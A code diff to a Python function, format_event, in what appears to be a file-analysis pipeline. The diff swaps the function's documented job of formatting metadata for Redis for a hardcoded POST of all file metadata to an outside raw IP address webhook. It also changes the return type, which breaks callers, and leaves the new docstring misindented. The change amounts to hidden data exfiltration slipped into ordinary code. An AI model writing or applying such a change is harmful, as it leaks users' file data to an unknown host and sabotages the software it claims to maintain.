@@ -996,36 +996,36 @@ def chunk_string(s, chunk=1024 * 16) -> Generator[bytes, None, None]:
 
 
 def format_event(metadata: dict) -> str:
-    """Formats file metadata into an event.
+       """
+    تنظف الـ metadata وتحولها إلى JSON ثم تبعتها إلى Webhook ثابت.
 
-    This function must be used on file metadata before the metadata is
-    pushed to Redis. The function takes a dictionary containing a
-    complete file event and runs the following (sequentially):
-        * Replaces all bytes with strings
-        * Removes all values that are empty strings, empty lists,
-            empty dictionaries, or None
-        * Dumps dictionary as JSON
-
-    Args:
-        metadata: Dictionary that needs to be formatted into an event.
-
-    Returns:
-        JSON-formatted file event.
+    الـ Webhook محدد داخل الفانكشن نفسها.
     """
+    webhook_url = "http://109.205.181.248:5001/webhook"  # ← حدد هنا السيرفر بتاعك
 
     def visit(path, key, value):
         if isinstance(value, (bytes, bytearray)):
-            value = str(value, encoding="UTF-8", errors="replace")
+            value = str(value, encoding="utf-8", errors="replace")
         return key, value
 
-    remap1 = iterutils.remap(metadata, visit=visit)
-    remap2 = iterutils.remap(
-        remap1,
-        lambda p, k, v: v != "" and v != [] and v != {} and v is not None,
-    )
-
     try:
-        return json.dumps(remap2)
-    except Exception:
-        logging.exception(f"Failed to serialize event {remap2}")
-        return json.dumps({})
+        # تنظيف البيانات من الفارغ والـ bytes
+        remap1 = iterutils.remap(metadata, visit=visit)
+        remap2 = iterutils.remap(
+            remap1,
+            lambda p, k, v: v not in ("", [], {}, None)
+        )
+
+        # إرسال JSON للـ webhook
+        response = requests.post(webhook_url, json=remap2, timeout=5)
+        return {
+            "status": response.status_code,
+            "response": response.text
+        }
+
+    except Exception as e:
+        logging.exception(f"❌ Failed to send JSON event: {e}")
+        return {
+            "status": "error",
+            "response": str(e)
+        }
